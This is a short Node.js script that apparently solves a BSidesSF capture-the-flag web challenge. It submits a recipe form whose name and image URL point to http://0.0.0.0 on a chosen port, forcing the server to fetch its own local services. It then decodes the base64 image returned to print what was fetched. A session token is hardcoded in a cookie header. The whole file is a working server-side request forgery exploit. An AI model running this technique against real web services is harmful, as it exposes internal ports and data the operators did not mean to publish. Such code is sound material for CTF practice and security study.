var request = require('request');
var base64 = require('base-64');
var utf8 = require('utf8');
const Entities = require('html-entities').AllHtmlEntities;
 
const entities = new Entities();

var makeRequest = function(port, callback) {

    var headers = {
        'authority': 'recipes-0abb43f9.challenges.bsidessf.net',
        'pragma': 'no-cache',
        'cache-control': 'no-cache',
        'origin': 'https://recipes-0abb43f9.challenges.bsidessf.net',
        'upgrade-insecure-requests': '1',
        'dnt': '1',
        'content-type': 'application/x-www-form-urlencoded',
        'user-agent': 'Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/80.0.3987.87 Safari/537.36',
        'sec-fetch-dest': 'document',
        'accept': 'text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.9',
        'sec-fetch-site': 'same-origin',
        'sec-fetch-mode': 'navigate',
        'sec-fetch-user': '?1',
        'referer': 'https://recipes-0abb43f9.challenges.bsidessf.net/recipe/new',
        'accept-language': 'en-US,en;q=0.9',
        'cookie': 'auth_token=eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9.eyJleHAiOjE1ODI1ODQ0MjUsImlhdCI6MTU4MjU4MDgyNSwiaXNzIjoicmVjaXBlYm90IiwibmJmIjoxNTgyNTgwODI1LCJzdWIiOiI1YzQ5MzI4ZS0wNWJlLTQ0ODItYmFkNS01YTVlYzVlZTU4NWQifQ.TE2sELQLJStGUjDD7aA2P9Jzr80SRApSMt03PxnzoHg'
    };
    
    var dataString = 'name=http%3A%2F%2F0.0.0.0%3A' + port + '&body=r&image_url=http%3A%2F%2F0.0.0.0%3A' + port;
    
    var options = {
        url: 'https://recipes-0abb43f9.challenges.bsidessf.net/recipe/new',
        method: 'POST',
        headers: headers,
        body: dataString,
        followAllRedirects: true
    };
    
    
    function requestCallback(error, response, body) {
        //console.log('body');
        if (!error && response.statusCode == 200) {
            callback(body);
        }
    }
    
    request(options, requestCallback);
};

makeRequest(process.argv[2], function(bodyText) {
    var matches = entities.decode(bodyText).match(/base64,([\w\+=]+)" class/);
    var decoded = utf8.decode(base64.decode(matches[1]));
    console.log(decoded);
});
